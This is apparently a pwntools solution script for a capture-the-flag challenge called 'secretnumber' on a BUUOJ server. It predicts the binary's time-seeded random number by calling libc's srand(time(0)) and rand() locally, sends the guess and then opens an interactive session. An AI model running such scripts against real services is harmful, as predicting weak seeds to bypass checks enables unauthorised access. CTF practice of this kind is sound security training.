'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled

pseudorandom
randn = time(0)
srand(randn)    
'''

from pwn import *
from ctypes import *
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", "25830" 
filename = "./secretnumber"
elf = ELF(filename)
libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)
    pass

# secret_bss_addr = 0x000000000000404C

def B():
    gdb.attach(io)
    pause()

def pwn():
    seed=libc.time(0)
    libc.srand(seed)
    random_num = libc.rand()

    payload = b'0'
    io.sendlineafter(b'gift?(0/1)\n', payload)
    payload = str(random_num)
    io.sendlineafter(b"Guess the number\n", payload)
    

if __name__ == "__main__":
    pwn()
    io.interactive()
